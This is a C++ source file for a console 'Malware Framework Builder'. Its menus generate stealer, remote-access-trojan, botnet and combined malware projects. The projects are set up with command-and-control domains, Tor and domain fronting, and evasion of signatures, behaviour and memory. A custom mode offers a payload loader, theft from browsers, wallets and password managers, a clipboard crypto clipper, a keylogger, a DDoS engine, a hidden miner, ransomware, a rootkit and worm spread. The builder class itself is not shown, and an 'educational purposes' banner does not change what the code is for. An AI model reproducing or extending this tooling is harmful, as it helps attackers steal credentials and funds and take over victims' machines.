#include <iostream>
#include <string>
#include <vector>
#include "malware_framework_builder.h"

void show_menu() {
    std::cout << "\n🛠️  Malware Framework Builder v1.0" << std::endl;
    std::cout << "===================================" << std::endl;
    std::cout << "1. Basic Stealer Framework" << std::endl;
    std::cout << "2. Advanced RAT Framework" << std::endl;
    std::cout << "3. Botnet Framework" << std::endl;
    std::cout << "4. Ultimate Framework (All Features)" << std::endl;
    std::cout << "5. Custom Framework Builder" << std::endl;
    std::cout << "6. Exit" << std::endl;
    std::cout << "\nSelect an option: ";
}

void create_basic_stealer() {
    std::cout << "\n🔧 Creating Basic Stealer Framework..." << std::endl;
    
    MalwareFrameworkBuilder builder;
    
    // Configure basic stealer
    builder.set_framework_name("BasicStealer");
    builder.set_namespace("StealerFramework");
    builder.set_author("Security Researcher");
    builder.set_version("1.0.0");
    builder.set_target_platform("Windows");
    builder.set_target_architecture("x64");
    
    // Load stealer preset
    builder.load_basic_stealer_preset();
    
    // Add C2 configuration
    builder.add_c2_domain("stealer-c2.example.com");
    builder.add_c2_domain("backup-c2.example.com");
    builder.add_c2_port(443);
    builder.add_c2_port(8080);
    builder.set_c2_protocol("HTTPS");
    builder.set_encryption_algorithm("AES256");
    
    // Generate files
    if (builder.generate_files("./BasicStealer")) {
        std::cout << "✅ Basic Stealer Framework generated successfully!" << std::endl;
        std::cout << "📁 Files created in ./BasicStealer/" << std::endl;
    }
}

void create_advanced_rat() {
    std::cout << "\n🔧 Creating Advanced RAT Framework..." << std::endl;
    
    MalwareFrameworkBuilder builder;
    
    // Configure advanced RAT
    builder.set_framework_name("AdvancedRAT");
    builder.set_namespace("RATFramework");
    builder.set_author("Advanced Developer");
    builder.set_version("2.0.0");
    builder.set_target_platform("Windows");
    builder.set_target_architecture("x64");
    
    // Load RAT preset
    builder.load_advanced_rat_preset();
    
    // Enable advanced features
    builder.enable_tor_support(true);
    builder.enable_domain_fronting(true);
    builder.enable_signature_evasion(true);
    builder.enable_behavior_evasion(true);
    
    // Add C2 configuration
    builder.add_c2_domain("rat-command.example.com");
    builder.add_c2_domain("control-panel.example.com");
    builder.add_c2_port(443);
    builder.add_c2_port(80);
    builder.set_c2_protocol("HTTPS");
    builder.set_encryption_algorithm("ChaCha20");
    
    // Generate files
    if (builder.generate_files("./AdvancedRAT")) {
        std::cout << "✅ Advanced RAT Framework generated successfully!" << std::endl;
        std::cout << "📁 Files created in ./AdvancedRAT/" << std::endl;
    }
}

void create_botnet() {
    std::cout << "\n🔧 Creating Botnet Framework..." << std::endl;
    
    MalwareFrameworkBuilder builder;
    
    // Configure botnet
    builder.set_framework_name("PowerBotnet");
    builder.set_namespace("BotnetFramework");
    builder.set_author("Botnet Master");
    builder.set_version("3.0.0");
    builder.set_target_platform("Windows");
    builder.set_target_architecture("x64");
    
    // Load botnet preset
    builder.load_botnet_preset();
    
    // Enable P2P and advanced features
    builder.enable_p2p_communication(true);
    builder.enable_blockchain_c2(true);
    builder.enable_steganography(true);
    builder.enable_memory_evasion(true);
    builder.enable_network_evasion(true);
    
    // Add multiple C2 servers for redundancy
    builder.add_c2_domain("primary-c2.botnet.example");
    builder.add_c2_domain("backup1-c2.botnet.example");
    builder.add_c2_domain("backup2-c2.botnet.example");
    builder.add_c2_port(443);
    builder.add_c2_port(8443);
    builder.add_c2_port(80);
    builder.set_c2_protocol("HTTPS");
    
    // Generate files
    if (builder.generate_files("./PowerBotnet")) {
        std::cout << "✅ Botnet Framework generated successfully!" << std::endl;
        std::cout << "📁 Files created in ./PowerBotnet/" << std::endl;
    }
}

void create_ultimate_framework() {
    std::cout << "\n🔧 Creating Ultimate Framework (All Features)..." << std::endl;
    
    MalwareFrameworkBuilder builder;
    
    // Configure ultimate framework
    builder.set_framework_name("UltimateMalware");
    builder.set_namespace("UltimateFramework");
    builder.set_author("Elite Developer");
    builder.set_version("4.0.0");
    builder.set_target_platform("Windows");
    builder.set_target_architecture("x64");
    
    // Load ultimate preset (all components)
    builder.load_ultimate_preset();
    
    // Enable ALL advanced features
    builder.enable_domain_fronting(true);
    builder.enable_tor_support(true);
    builder.enable_p2p_communication(true);
    builder.enable_blockchain_c2(true);
    builder.enable_steganography(true);
    builder.enable_signature_evasion(true);
    builder.enable_behavior_evasion(true);
    builder.enable_memory_evasion(true);
    builder.enable_network_evasion(true);
    
    // Comprehensive C2 configuration
    builder.add_c2_domain("primary.ultimate-c2.example");
    builder.add_c2_domain("backup.ultimate-c2.example");
    builder.add_c2_domain("emergency.ultimate-c2.example");
    builder.add_c2_port(443);
    builder.add_c2_port(8443);
    builder.add_c2_port(80);
    builder.add_c2_port(53); // DNS
    builder.set_c2_protocol("HTTPS");
    builder.set_encryption_algorithm("AES256");
    
    // Generate files
    if (builder.generate_files("./UltimateMalware")) {
        std::cout << "✅ Ultimate Framework generated successfully!" << std::endl;
        std::cout << "📁 Files created in ./UltimateMalware/" << std::endl;
        std::cout << "⚠️  Warning: This framework includes ALL malware capabilities!" << std::endl;
    }
}

void create_custom_framework() {
    std::cout << "\n🎛️  Custom Framework Builder" << std::endl;
    std::cout << "=============================" << std::endl;
    
    MalwareFrameworkBuilder builder;
    
    // Get basic configuration
    std::string name, ns, author, version, platform, arch;
    
    std::cout << "Framework name: ";
    std::getline(std::cin, name);
    if (!name.empty()) builder.set_framework_name(name);
    
    std::cout << "Namespace: ";
    std::getline(std::cin, ns);
    if (!ns.empty()) builder.set_namespace(ns);
    
    std::cout << "Author: ";
    std::getline(std::cin, author);
    if (!author.empty()) builder.set_author(author);
    
    std::cout << "Version: ";
    std::getline(std::cin, version);
    if (!version.empty()) builder.set_version(version);
    
    std::cout << "Target platform (Windows/Linux/macOS): ";
    std::getline(std::cin, platform);
    if (!platform.empty()) builder.set_target_platform(platform);
    
    std::cout << "Target architecture (x86/x64/ARM): ";
    std::getline(std::cin, arch);
    if (!arch.empty()) builder.set_target_architecture(arch);
    
    // Component selection
    std::cout << "\n📦 Select Components (y/n):" << std::endl;
    
    char choice;
    
    std::cout << "Payload Loader (downloads/executes payloads): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::PAYLOAD_LOADER);
    }
    
    std::cout << "Data Stealer (browsers, wallets, apps): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::DATA_STEALER);
        builder.add_all_browser_targets();
        builder.add_all_wallet_targets();
    }
    
    std::cout << "Crypto Clipper (clipboard monitoring): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::CRYPTO_CLIPPER);
    }
    
    std::cout << "Remote Shell (command execution): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::REMOTE_SHELL);
    }
    
    std::cout << "Reverse Proxy (proxy server): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::REVERSE_PROXY);
    }
    
    std::cout << "DDOS Engine (attack capabilities): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::DDOS_ENGINE);
        builder.add_all_ddos_types();
    }
    
    std::cout << "Silent Miner (cryptocurrency mining): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::SILENT_MINER);
        builder.add_all_mining_algorithms();
    }
    
    std::cout << "DNS Poisoner (DNS redirection): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::DNS_POISONER);
    }
    
    std::cout << "Keylogger (keystroke recording): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::KEYLOGGER);
    }
    
    std::cout << "Screen Capture (screenshots/webcam): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::SCREEN_CAPTURE);
    }
    
    std::cout << "Anti-Detection (evasion techniques): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::ANTI_DETECTION);
        builder.add_all_anti_detection_techniques();
    }
    
    std::cout << "Persistence (maintain access): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::PERSISTENCE);
        builder.add_all_persistence_methods();
    }
    
    std::cout << "C2 Communication (command & control): ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.add_component(MalwareFrameworkBuilder::ComponentType::C2_COMMUNICATION);
    }
    
    // Advanced features
    std::cout << "\n🚀 Advanced Features (y/n):" << std::endl;
    
    std::cout << "Enable Tor support: ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.enable_tor_support(true);
    }
    
    std::cout << "Enable domain fronting: ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.enable_domain_fronting(true);
    }
    
    std::cout << "Enable P2P communication: ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.enable_p2p_communication(true);
    }
    
    std::cout << "Enable signature evasion: ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.enable_signature_evasion(true);
    }
    
    std::cout << "Enable behavior evasion: ";
    std::cin >> choice;
    if (choice == 'y' || choice == 'Y') {
        builder.enable_behavior_evasion(true);
    }
    
    // C2 configuration
    std::cout << "\n🌐 C2 Configuration:" << std::endl;
    std::string domain;
    
    std::cout << "Primary C2 domain: ";
    std::cin >> domain;
    if (!domain.empty()) {
        builder.add_c2_domain(domain);
    }
    
    std::cout << "Backup C2 domain (optional): ";
    std::cin >> domain;
    if (!domain.empty()) {
        builder.add_c2_domain(domain);
    }
    
    builder.add_c2_port(443);
    builder.add_c2_port(80);
    builder.set_c2_protocol("HTTPS");
    builder.set_encryption_algorithm("AES256");
    
    // Generate custom framework
    std::string output_dir = "./" + (name.empty() ? "CustomFramework" : name);
    if (builder.generate_files(output_dir)) {
        std::cout << "✅ Custom Framework generated successfully!" << std::endl;
        std::cout << "📁 Files created in " << output_dir << "/" << std::endl;
    }
}

void show_framework_capabilities() {
    std::cout << "\n📋 Available Framework Capabilities" << std::endl;
    std::cout << "=====================================" << std::endl;
    
    std::cout << "\n🔧 Core Components:" << std::endl;
    std::cout << "• Payload Loader - Downloads and executes payloads in memory" << std::endl;
    std::cout << "• Data Stealer - Extracts data from browsers, wallets, applications" << std::endl;
    std::cout << "• Crypto Clipper - Monitors and replaces cryptocurrency addresses" << std::endl;
    std::cout << "• Remote Shell - Provides remote command execution (CMD/PowerShell)" << std::endl;
    std::cout << "• Reverse Proxy - Turns infected machines into proxy servers" << std::endl;
    std::cout << "• DDOS Engine - Multiple attack types (TCP, UDP, HTTP, SYN, etc.)" << std::endl;
    std::cout << "• Silent Miner - Background cryptocurrency mining" << std::endl;
    std::cout << "• DNS Poisoner - Redirects DNS queries to malicious servers" << std::endl;
    std::cout << "• Keylogger - Records keystrokes and system activity" << std::endl;
    std::cout << "• Screen Capture - Screenshots and webcam capture" << std::endl;
    std::cout << "• File Manager - Remote file system access" << std::endl;
    std::cout << "• Process Manager - Remote process management" << std::endl;
    std::cout << "• Anti-Detection - VM/Sandbox/Debug evasion" << std::endl;
    std::cout << "• Persistence - Multiple installation methods" << std::endl;
    std::cout << "• C2 Communication - Encrypted command & control" << std::endl;
    std::cout << "• IRC Bot - IRC-based RAT functionality" << std::endl;
    std::cout << "• Rootkit - Kernel-level hiding" << std::endl;
    std::cout << "• Bootkit - Boot-level persistence" << std::endl;
    std::cout << "• Ransomware - File encryption capabilities" << std::endl;
    std::cout << "• Worm Propagation - Self-spreading functionality" << std::endl;
    
    std::cout << "\n🎯 Supported Targets:" << std::endl;
    std::cout << "• Browsers: Chrome, Firefox, Edge, Brave, Opera, Vivaldi, Yandex" << std::endl;
    std::cout << "• Crypto Wallets: MetaMask, Exodus, Atomic, Electrum, Bitcoin Core" << std::endl;
    std::cout << "• Messaging: Telegram, Discord, Signal, WhatsApp, Slack" << std::endl;
    std::cout << "• Gaming: Steam, Epic Games, Battle.net, Riot Games" << std::endl;
    std::cout << "• Email: Outlook, Thunderbird, Gmail" << std::endl;
    std::cout << "• Password Managers: Bitwarden, KeePass, LastPass, 1Password" << std::endl;
    std::cout << "• Cloud Storage: Google Drive, Dropbox, OneDrive, MEGA" << std::endl;
    std::cout << "• VPN Clients: NordVPN, ExpressVPN, ProtonVPN, Surfshark" << std::endl;
    std::cout << "• System: Windows Credentials, WiFi Passwords, SSH Keys, Certificates" << std::endl;
    
    std::cout << "\n🚀 Advanced Features:" << std::endl;
    std::cout << "• Domain Fronting - Hide C2 traffic behind legitimate domains" << std::endl;
    std::cout << "• Tor Support - Route traffic through Tor network" << std::endl;
    std::cout << "• P2P Communication - Peer-to-peer botnet architecture" << std::endl;
    std::cout << "• Blockchain C2 - Use blockchain for command distribution" << std::endl;
    std::cout << "• Steganography - Hide data in images/files" << std::endl;
    std::cout << "• Multi-layer Encryption - AES256, ChaCha20, XOR" << std::endl;
    std::cout << "• Code Obfuscation - API hashing, string encryption" << std::endl;
    std::cout << "• Polymorphic Generation - Change signatures per build" << std::endl;
    std::cout << "• Cross-platform Support - Windows, Linux, macOS" << std::endl;
    std::cout << "• Multi-architecture - x86, x64, ARM" << std::endl;
}

int main() {
    std::cout << "🚀 Malware Framework Builder" << std::endl;
    std::cout << "=============================" << std::endl;
    std::cout << "⚠️  FOR EDUCATIONAL/RESEARCH PURPOSES ONLY ⚠️" << std::endl;
    std::cout << "The generated frameworks are for security research" << std::endl;
    std::cout << "and educational purposes. Use responsibly." << std::endl;
    
    show_framework_capabilities();
    
    int choice;
    do {
        show_menu();
        std::cin >> choice;
        std::cin.ignore(); // Clear input buffer
        
        switch (choice) {
            case 1:
                create_basic_stealer();
                break;
            case 2:
                create_advanced_rat();
                break;
            case 3:
                create_botnet();
                break;
            case 4:
                create_ultimate_framework();
                break;
            case 5:
                create_custom_framework();
                break;
            case 6:
                std::cout << "\n👋 Exiting Framework Builder..." << std::endl;
                break;
            default:
                std::cout << "❌ Invalid option. Please try again." << std::endl;
                break;
        }
        
        if (choice >= 1 && choice <= 5) {
            std::cout << "\n🏁 Framework generation completed!" << std::endl;
            std::cout << "📝 Check the generated README file for usage instructions." << std::endl;
            std::cout << "🔨 Use CMake to build the generated framework." << std::endl;
        }
        
    } while (choice != 6);
    
    std::cout << "\n✅ Thank you for using Malware Framework Builder!" << std::endl;
    return 0;
}